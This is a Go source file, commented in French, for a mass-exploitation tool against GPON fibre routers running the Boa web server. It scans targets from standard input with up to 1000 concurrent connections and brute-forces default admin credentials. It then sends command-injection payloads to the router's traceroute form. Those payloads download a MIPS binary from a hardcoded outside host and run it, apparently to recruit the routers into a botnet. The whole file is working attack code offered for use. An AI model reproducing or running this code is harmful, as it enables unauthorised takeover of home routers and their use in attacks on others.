/*
Thrown out by bermuda!
*/

package main

import (
	"fmt"
    "net"
    "time"
    "bufio"
    "os"
    "sync"
    "strings"
	"strconv"
    "math/rand"
)

var syncWait sync.WaitGroup
var statusLogins, statusAttempted, statusFound int
var mutex sync.Mutex
var maxConcurrent = 1000 // Limite de connexions simultanées
var semaphore chan struct{}

// Liste étendue de combinaisons login:password
var loginsString = []string{
	"adminisp:adminisp", "admin:admin", "admin:123456", "admin:user", "admin:1234", 
	"guest:guest", "support:support", "user:user", "admin:password", "default:default", 
	"admin:password123", "admin:", "root:root", "admin:admin123", "admin:12345", 
	"admin:pass", "admin:password1", "root:admin", "root:password", "root:1234", 
	"admin:qwerty", "admin:abc123", "root:123456", "user:password", "user:1234"
}

func zeroByte(a []byte) {
    for i := range a {
        a[i] = 0
    }
}

func sendExploit(target string) int {
	// Utiliser un timeout plus court pour l'envoi d'exploit
	timeout := 20 * time.Second

	conn, err := net.DialTimeout("tcp", target, timeout)
	if err != nil {
		return -1
	}
	defer conn.Close() // Assure que la connexion est fermée même en cas d'erreur

	// Essayer plusieurs exploits différents pour augmenter les chances de succès
	exploits := []string{
		// Exploit original
		"target_addr=%3Brm%20-rf%20/var/tmp/wlancont%3Bwget%20http://90.70.15.0:1337/hidakibest.mips%20-O%20->/var/tmp/wlancont%3Bchmod%20777%20/var/tmp/wlancont%3B/var/tmp/wlancont%20fiber&waninf=1_INTERNET_R_VID_",
		// Exploit alternatif avec curl au lieu de wget
		"target_addr=%3Brm%20-rf%20/var/tmp/wlancont%3Bcurl%20http://90.70.15.0:1337/hidakibest.mips%20-o%20/var/tmp/wlancont%3Bchmod%20777%20/var/tmp/wlancont%3B/var/tmp/wlancont%20fiber&waninf=1_INTERNET_R_VID_",
		// Exploit pour différents chemins de fichier
		"target_addr=%3Brm%20-rf%20/tmp/wlancont%3Bwget%20http://90.70.15.0:1337/hidakibest.mips%20-O%20->/tmp/wlancont%3Bchmod%20777%20/tmp/wlancont%3B/tmp/wlancont%20fiber&waninf=1_INTERNET_R_VID_"
	}

	// Essayer chaque exploit
	for _, exploit := range exploits {
		conn.SetWriteDeadline(time.Now().Add(timeout))
		conn.Write([]byte("POST /boaform/admin/formTracert HTTP/1.1\r\nHost: " + target + "\r\nUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:77.0) Gecko/20100101 Firefox/77.0\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\nAccept-Language: en-GB,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: " + strconv.Itoa(len(exploit)) + "\r\nOrigin: http://" + target + "\r\nConnection: close\r\nReferer: http://" + target + "/diag_tracert_admin_en.asp\r\nUpgrade-Insecure-Requests: 1\r\n\r\n" + exploit + "\r\n\r\n"))
		
		// Pas besoin de vérifier la réponse, on essaie juste d'envoyer l'exploit
		time.Sleep(100 * time.Millisecond) // Petite pause entre les tentatives
	}

	return 1 // Retourne succès si on a pu envoyer les exploits
}

func sendLogin(target string) int {
	var isLoggedIn int = 0
	var cntLen int

	// Utiliser un timeout plus court pour les tentatives de connexion
	timeout := 15 * time.Second

	for x := 0; x < len(loginsString); x++ {
		loginSplit := strings.Split(loginsString[x], ":")

		conn, err := net.DialTimeout("tcp", target, timeout)
	    if err != nil {
			return -1
	    }
		defer conn.Close() // Assure que la connexion est fermée même en cas d'erreur

		cntLen = 14
		cntLen += len(loginSplit[0])
		cntLen += len(loginSplit[1])

	    conn.SetWriteDeadline(time.Now().Add(timeout))
	    conn.Write([]byte("POST /boaform/admin/formLogin HTTP/1.1\r\nHost: " + target + "\r\nUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-GB,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: " + strconv.Itoa(cntLen) + "\r\nOrigin: http://" + target + "\r\nConnection: keep-alive\r\nReferer: http://" + target + "/admin/login.asp\r\nUpgrade-Insecure-Requests: 1\r\n\r\nusername=" + loginSplit[0] + "&psd=" + loginSplit[1] + "\r\n\r\n"))
		conn.SetReadDeadline(time.Now().Add(timeout))

		bytebuf := make([]byte, 512)
		l, err := conn.Read(bytebuf)
		if err != nil || l <= 0 {
		    return -1
		}

		// Vérifier plusieurs réponses de succès possibles
		response := string(bytebuf)
		if strings.Contains(response, "HTTP/1.0 302 Moved Temporarily") || 
		   strings.Contains(response, "HTTP/1.1 302") || 
		   strings.Contains(response, "Location: /index.asp") || 
		   strings.Contains(response, "Location: /admin/index") {
			isLoggedIn = 1
		}

		zeroByte(bytebuf)

		if isLoggedIn == 0 {
			continue
		}

		mutex.Lock()
		statusLogins++
		mutex.Unlock()
		break
	}

	return isLoggedIn
}

func checkDevice(target string, timeout time.Duration) int {
	var isGpon int = 0

	// Utiliser un timeout plus court pour les vérifications initiales
	conn, err := net.DialTimeout("tcp", target, timeout * time.Second / 2)
    if err != nil {
		return -1
    }
    defer conn.Close() // Assure que la connexion est fermée même en cas d'erreur
    
    conn.SetWriteDeadline(time.Now().Add(timeout * time.Second / 2))
    conn.Write([]byte("POST /boaform/admin/formLogin HTTP/1.1\r\nHost: " + target + "\r\nUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-GB,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 29\r\nOrigin: http://" + target + "\r\nConnection: keep-alive\r\nReferer: http://" + target + "/admin/login.asp\r\nUpgrade-Insecure-Requests: 1\r\n\r\nusername=admin&psd=Feefifofum\r\n\r\n"))
	conn.SetReadDeadline(time.Now().Add(timeout * time.Second / 2))

	bytebuf := make([]byte, 512)
	l, err := conn.Read(bytebuf)
	if err != nil || l <= 0 {
	    return -1
	}

	// Vérifie plusieurs signatures de serveurs vulnérables
	response := string(bytebuf)
	if strings.Contains(response, "Server: Boa/0.93.15") || 
	   strings.Contains(response, "Server: Boa/") || 
	   strings.Contains(response, "GPON") {
		mutex.Lock()
		statusFound++
		mutex.Unlock()
		isGpon = 1
	}
	zeroByte(bytebuf)

	return isGpon
}

func processTarget(target string, rtarget string) {
	defer syncWait.Done()
	defer func() { <-semaphore }() // Libère une place dans le sémaphore

	// Vérifie si l'appareil est vulnérable avec un timeout plus court
	if checkDevice(target, 5) == 1 {
		// Si l'appareil est vulnérable, essaie de se connecter
		if sendLogin(target) == 1 {
			// Si la connexion réussit, envoie l'exploit
			sendExploit(target)
		}
	}
}

func main() {
	rand.Seed(time.Now().UTC().UnixNano())
	var i int = 0

	// Initialiser le sémaphore pour limiter les connexions concurrentes
	semaphore = make(chan struct{}, maxConcurrent)

	// Vérifier les arguments de ligne de commande
	if len(os.Args) < 2 {
		fmt.Println("Usage: ./fiber <port>")
		os.Exit(1)
	}

	// Afficher les statistiques en temps réel
	go func() {
		for {
			fmt.Printf("%d's | Total: %d, Found: %d, Logins: %d | Concurrents: %d\r\n", 
				i, statusAttempted, statusFound, statusLogins, len(semaphore))
			time.Sleep(1 * time.Second)
			i++
		}
	}()

	// Scanner pour les cibles
	r := bufio.NewReader(os.Stdin)
	scan := bufio.NewScanner(r)
	scan.Buffer(make([]byte, 1024*1024), 1024*1024) // Augmenter la taille du buffer

	for scan.Scan() {
		target := scan.Text()
		
		// Ajouter une entrée au sémaphore (bloque si maxConcurrent est atteint)
		semaphore <- struct{}{}
		
		// Lancer une goroutine pour traiter la cible
		syncWait.Add(1)
		go processTarget(target + ":" + os.Args[1], target)
		
		mutex.Lock()
		statusAttempted++
		mutex.Unlock()
	}

	// Attendre que toutes les goroutines terminent
	syncWait.Wait()
	fmt.Println("Scan terminé. Résultats finaux:")
	fmt.Printf("Total: %d, Trouvés: %d, Logins réussis: %d\n", statusAttempted, statusFound, statusLogins)
}
